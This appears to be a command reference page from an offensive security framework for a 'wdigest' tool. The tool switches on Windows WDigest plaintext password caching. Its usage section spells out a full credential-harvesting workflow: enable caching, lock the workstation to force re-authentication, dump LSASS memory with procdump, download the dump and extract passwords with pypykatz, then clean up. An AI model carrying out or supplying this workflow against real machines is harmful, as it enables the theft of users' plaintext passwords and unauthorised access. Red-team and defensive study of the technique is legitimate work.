+++
title = "wdigest"
chapter = false
weight = 159
hidden = false
+++

## Summary

Manage WDigest plaintext credential caching in LSASS. On Windows 10 and later, WDigest authentication is disabled by default, meaning cleartext passwords are not stored in LSASS memory. Enabling WDigest forces Windows to cache plaintext credentials for users who authenticate interactively (console logon, RDP, runas), which can then be extracted via LSASS memory dump.

{{% notice info %}}Windows Only{{% /notice %}}

{{% notice warning %}}Requires Administrator or SYSTEM privileges to modify registry.{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | status | `status` — check current WDigest state; `enable` — turn on plaintext caching; `disable` — turn off |

## Usage

### Check current status
```
wdigest -action status
```

### Enable plaintext credential caching
```
wdigest -action enable
```

### Disable plaintext credential caching
```
wdigest -action disable
```

### Credential harvesting workflow
```
wdigest -action enable
# Wait for user to re-authenticate (or lock workstation to force it)
# Then dump LSASS:
procdump -pid <lsass_pid> -output C:\Temp\lsass.dmp
download C:\Temp\lsass.dmp
# Offline: pypykatz lsa minidump lsass.dmp
wdigest -action disable   # Clean up
```

## MITRE ATT&CK Mapping

- **T1003.001** — OS Credential Dumping: LSASS Memory
- **T1112** — Modify Registry

## Notes

- Sets `HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential` (DWORD)
- Value 1 = enabled (cache plaintext), 0 = disabled, not set = OS default (disabled on Win10+)
- After enabling, users must re-authenticate for credentials to appear in LSASS
- Lock the workstation (`rundll32 user32.dll,LockWorkStation`) to force re-authentication
- Remember to disable WDigest after harvesting to restore the default security posture
